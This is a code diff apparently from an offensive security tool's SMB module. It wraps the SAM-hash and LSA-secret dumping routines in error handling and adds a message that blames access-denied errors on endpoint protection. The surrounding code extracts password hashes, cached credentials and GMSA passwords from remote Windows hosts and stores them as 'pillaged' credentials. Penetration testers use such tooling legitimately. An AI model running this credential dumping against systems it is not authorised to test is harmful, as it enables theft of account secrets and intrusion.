@@ -1653,42 +1653,48 @@ class smb(connection):
 
     @requires_admin
     def sam(self):
-        self.enable_remoteops()
-        host_id = self.db.get_hosts(filter_term=self.host)[0][0]
+        try:
+            self.enable_remoteops()
+            host_id = self.db.get_hosts(filter_term=self.host)[0][0]
 
-        def add_sam_hash(sam_hash, host_id):
-            add_sam_hash.sam_hashes += 1
-            self.logger.highlight(sam_hash)
-            username, _, lmhash, nthash, _, _, _ = sam_hash.split(":")
-            self.db.add_credential(
-                "hash",
-                self.hostname,
-                username,
-                ":".join((lmhash, nthash)),
-                pillaged_from=host_id,
-            )
+            def add_sam_hash(sam_hash, host_id):
+                add_sam_hash.sam_hashes += 1
+                self.logger.highlight(sam_hash)
+                username, _, lmhash, nthash, _, _, _ = sam_hash.split(":")
+                self.db.add_credential(
+                    "hash",
+                    self.hostname,
+                    username,
+                    ":".join((lmhash, nthash)),
+                    pillaged_from=host_id,
+                )
 
-        add_sam_hash.sam_hashes = 0
+            add_sam_hash.sam_hashes = 0
 
-        if self.remote_ops and self.bootkey:
-            SAM_file_name = self.remote_ops.saveSAM()
-            SAM = SAMHashes(
-                SAM_file_name,
-                self.bootkey,
-                isRemote=True,
-                perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
-            )
+            if self.remote_ops and self.bootkey:
+                SAM_file_name = self.remote_ops.saveSAM()
+                SAM = SAMHashes(
+                    SAM_file_name,
+                    self.bootkey,
+                    isRemote=True,
+                    perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
+                )
 
-            self.logger.display("Dumping SAM hashes")
-            SAM.dump()
-            SAM.export(self.output_filename)
-            self.logger.success(f"Added {highlight(add_sam_hash.sam_hashes)} SAM hashes to the database")
+                self.logger.display("Dumping SAM hashes")
+                SAM.dump()
+                SAM.export(self.output_filename)
+                self.logger.success(f"Added {highlight(add_sam_hash.sam_hashes)} SAM hashes to the database")
 
-            try:
-                self.remote_ops.finish()
-            except Exception as e:
-                self.logger.debug(f"Error calling remote_ops.finish(): {e}")
-            SAM.finish()
+                try:
+                    self.remote_ops.finish()
+                except Exception as e:
+                    self.logger.debug(f"Error calling remote_ops.finish(): {e}")
+                SAM.finish()
+        except SessionError as e:
+            if "STATUS_ACCESS_DENIED" in e.getErrorString():
+                self.logger.fail("Error \"STATUS_ACCESS_DENIED\" while dumping SAM. This is likely due to an endpoint protection.")
+        except Exception as e:
+            self.logger.exception(str(e))
 
     @requires_admin
     def dpapi(self):
@@ -1893,44 +1899,50 @@ class smb(connection):
 
     @requires_admin
     def lsa(self):
-        self.enable_remoteops()
+        try:
+            self.enable_remoteops()
 
-        def add_lsa_secret(secret):
-            add_lsa_secret.secrets += 1
-            self.logger.highlight(secret)
-            if "_SC_GMSA_{84A78B8C" in secret:
-                gmsa_id = secret.split("_")[4].split(":")[0]
-                data = bytes.fromhex(secret.split("_")[4].split(":")[1])
-                blob = MSDS_MANAGEDPASSWORD_BLOB()
-                blob.fromString(data)
-                currentPassword = blob["CurrentPassword"][:-2]
-                ntlm_hash = MD4.new()
-                ntlm_hash.update(currentPassword)
-                passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
-                self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")
+            def add_lsa_secret(secret):
+                add_lsa_secret.secrets += 1
+                self.logger.highlight(secret)
+                if "_SC_GMSA_{84A78B8C" in secret:
+                    gmsa_id = secret.split("_")[4].split(":")[0]
+                    data = bytes.fromhex(secret.split("_")[4].split(":")[1])
+                    blob = MSDS_MANAGEDPASSWORD_BLOB()
+                    blob.fromString(data)
+                    currentPassword = blob["CurrentPassword"][:-2]
+                    ntlm_hash = MD4.new()
+                    ntlm_hash.update(currentPassword)
+                    passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
+                    self.logger.highlight(f"GMSA ID: {gmsa_id:<20} NTLM: {passwd}")
 
-        add_lsa_secret.secrets = 0
+            add_lsa_secret.secrets = 0
 
-        if self.remote_ops and self.bootkey:
-            SECURITYFileName = self.remote_ops.saveSECURITY()
-            LSA = LSASecrets(
-                SECURITYFileName,
-                self.bootkey,
-                self.remote_ops,
-                isRemote=True,
-                perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
-            )
-            self.logger.success("Dumping LSA secrets")
-            LSA.dumpCachedHashes()
-            LSA.exportCached(self.output_filename)
-            LSA.dumpSecrets()
-            LSA.exportSecrets(self.output_filename)
-            self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {self.output_filename + '.secrets'} and {self.output_filename + '.cached'}")
-            try:
-                self.remote_ops.finish()
-            except Exception as e:
-                self.logger.debug(f"Error calling remote_ops.finish(): {e}")
-            LSA.finish()
+            if self.remote_ops and self.bootkey:
+                SECURITYFileName = self.remote_ops.saveSECURITY()
+                LSA = LSASecrets(
+                    SECURITYFileName,
+                    self.bootkey,
+                    self.remote_ops,
+                    isRemote=True,
+                    perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
+                )
+                self.logger.success("Dumping LSA secrets")
+                LSA.dumpCachedHashes()
+                LSA.exportCached(self.output_filename)
+                LSA.dumpSecrets()
+                LSA.exportSecrets(self.output_filename)
+                self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {self.output_filename + '.secrets'} and {self.output_filename + '.cached'}")
+                try:
+                    self.remote_ops.finish()
+                except Exception as e:
+                    self.logger.debug(f"Error calling remote_ops.finish(): {e}")
+                LSA.finish()
+        except SessionError as e:
+            if "STATUS_ACCESS_DENIED" in e.getErrorString():
+                self.logger.fail("Error \"STATUS_ACCESS_DENIED\" while dumping LSA. This is likely due to an endpoint protection.")
+        except Exception as e:
+            self.logger.exception(str(e))
 
     def ntds(self):
         self.enable_remoteops()
